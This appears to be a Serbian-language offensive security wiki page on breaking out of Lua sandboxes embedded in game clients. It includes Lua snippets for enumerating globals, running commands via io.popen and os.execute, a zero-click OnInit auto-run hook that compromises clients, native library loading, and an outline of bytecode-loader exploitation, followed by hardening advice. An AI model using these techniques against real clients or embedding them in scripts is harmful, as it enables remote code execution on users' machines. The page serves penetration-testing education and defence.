# Zaobilaženje Lua sandboxova (ugrađene VM mašine, klijenti igara)

{{#include ../../../banners/hacktricks-training.md}}

Ova stranica prikuplja praktične tehnike za enumeraciju i izlazak iz Lua „sandboxova“ ugrađenih u aplikacije (naročito klijente igara, plugine ili scripting engine-ove unutar aplikacija). Mnogi engine-ovi izlažu ograničeno Lua okruženje, ali ostavljaju dostupne moćne globalne promenljive koje omogućavaju proizvoljno izvršavanje komandi ili čak korupciju nativne memorije kada su učitavači bytecode-a izloženi.

Ključne ideje:
- Tretirajte VM kao nepoznato okruženje: enumerišite _G i otkrijte koji su opasni primitivi dostupni.
- Kada su stdout/print blokirani, zloupotrebite bilo koji UI/IPC kanal unutar VM-a kao izlazno odredište kako biste posmatrali rezultate.
- Ako su io/os izloženi, često imate direktno izvršavanje komandi (io.popen, os.execute).
- Ako su load/loadstring/loadfile izloženi, izvršavanje posebno napravljenog Lua bytecode-a može narušiti memory safety u nekim verzijama (verifikatori u verzijama ≤5.1 mogu se zaobići; u verziji 5.2 verifikator je uklonjen), što omogućava naprednu eksploataciju.

## Enumerišite sandboxed okruženje

- Izbacite globalno okruženje da biste popisali dostupne tabele/funkcije:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ako print() nije dostupan, preusmerite kanale unutar VM-a. Primer iz VM-a za skripte za uređenje stanovanja u MMO igri, gde izlaz za chat radi samo nakon poziva zvuka; sledeće kreira pouzdanu izlaznu funkciju:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizujte ovaj obrazac za svoju metu: svaki textbox, toast, logger ili UI callback koji prihvata stringove može da posluži kao stdout za reconnaissance.

## Direktno izvršavanje komandi ako je io/os izložen

Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno imate neposredno izvršavanje komandi:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Napomene:

- Izvršavanje se odvija unutar klijentskog procesa; mnogi anti-cheat/antidebug slojevi koji blokiraju eksterne debuggere neće sprečiti kreiranje procesa unutar VM-a.
- Takođe proverite: package.loadlib (učitavanje proizvoljnih DLL/.so biblioteka), require sa native modulima, LuaJIT's ffi (ako je prisutan) i debug biblioteku (može podići privilegije unutar VM-a).

## Zero-click okidači putem auto-run callback funkcija

Ako host aplikacija prosleđuje skripte klijentima, a VM izlaže auto-run hook-ove (npr. OnInit/OnLoad/OnEnter), postavite svoj payload tamo radi drive-by kompromitovanja čim se skripta učita:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Svaki ekvivalentni callback (OnLoad, OnEnter itd.) generalizuje ovu tehniku kada se skripte automatski prenose i izvršavaju na klijentu.

## Opasne primitive koje treba tražiti tokom recon-a

Tokom enumeracije _G, posebno tražite:
- io, os: io.popen, os.execute, file I/O, pristup env-u.
- load, loadstring, loadfile, dofile: izvršavaju source ili bytecode; podržavaju učitavanje nepouzdanog bytecode-a.
- package, package.loadlib, require: učitavanje dynamic library-ja i površina modula.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo i hooks.
- Samo u LuaJIT-u: ffi.cdef, ffi.load za direktno pozivanje native code-a.

Minimalni primeri upotrebe (ako su dostupni):

Lua-ov loader API se menjao između verzija: u Lua 5.1, `load` čita iz reader funkcije, a `loadstring` čita iz stringa; Lua 5.2 `load` prihvata ili string ili reader funkciju, dok je `loadstring` deprecated kao njegov ekvivalent.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opciono eskaliranje: zloupotreba Lua bytecode loader-a

Kada su load/loadstring/loadfile dostupni, ali su io/os ograničeni, izvršavanje posebno kreiranog Lua bytecode-a može dovesti do memory disclosure i corruption primitives. Ključne činjenice:
- Lua ≤ 5.1 je imao ugrađeni bytecode verifier sa poznatim bypass-ima.<sup>[[4]](#references)</sup>
- Lua 5.2 je u potpunosti uklonio verifier (zvaničan stav: aplikacije bi jednostavno trebalo da odbijaju precompiled chunk-ove), čime se attack surface proširuje ako učitavanje bytecode-a nije zabranjeno.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflow obično izgleda ovako: leak pointer-a putem izlaza unutar VM-a, kreiranje bytecode-a koji izaziva type confusion (npr. oko FORLOOP ili drugih opcode-ova), a zatim pivot ka arbitrary read/write ili native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Ovaj put zavisi od engine-a i verzije i zahteva RE. Pogledajte reference za detaljne analize, exploitation primitives i primere gadget-a u igrama.

## Beleške o detekciji i hardening-u (za defendere)

- Server side: odbacite ili izmenite user scripts; dozvolite safe API-je putem allowlist-e; uklonite ili povežite sa praznim vrednostima io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: pokrenite Lua sa minimalnim _ENV, zabranite učitavanje bytecode-a, ponovo uvedite strogi bytecode verifier ili signature checks i blokirajte kreiranje procesa iz client process-a.
- Telemetrija: generišite alert na gameclient → child process creation ubrzo nakon učitavanja script-a; povežite to sa UI/chat/script događajima.

## References

- [1] [Ova kuća je ukleta: RCE stari čitavu deceniju u AION client-u (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Analiza bytecode-a: razotkrivanje bezbednosnih propusta Lua-e u Factorio-u](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Diskusija o uklanjanju bytecode verifier-a](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist sa verifier bypass-ima/beleškama)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Referentno uputstvo za Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Referentno uputstvo za Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
